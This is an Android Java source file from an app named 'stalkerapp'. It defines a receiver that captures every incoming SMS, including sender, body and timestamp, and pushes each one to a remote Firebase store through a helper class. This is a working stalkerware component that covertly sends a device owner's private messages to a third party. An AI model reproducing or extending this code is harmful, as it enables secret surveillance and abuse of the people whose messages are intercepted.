package com.github.saintedlittle.stalkerapp.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.github.saintedlittle.stalkerapp.data.SMSData;
import com.github.saintedlittle.stalkerapp.firebase.FirebaseSaver;

public class SMSReceiver extends BroadcastReceiver {
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals(SMS_RECEIVED_ACTION)) {
            // Extract the SMS messages from the intent
            SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (smsMessages != null && smsMessages.length > 0) {
                // Process each SMS message
                for (SmsMessage smsMessage : smsMessages) {
                    String sender = smsMessage.getOriginatingAddress();
                    String message = smsMessage.getMessageBody();
                    long timestamp = smsMessage.getTimestampMillis();

                    // Create an SMSData object
                    SMSData smsData = new SMSData(sender, message, timestamp);

                    new FirebaseSaver().pushNewSMS(smsData);

                }
            }
        }
    }
}
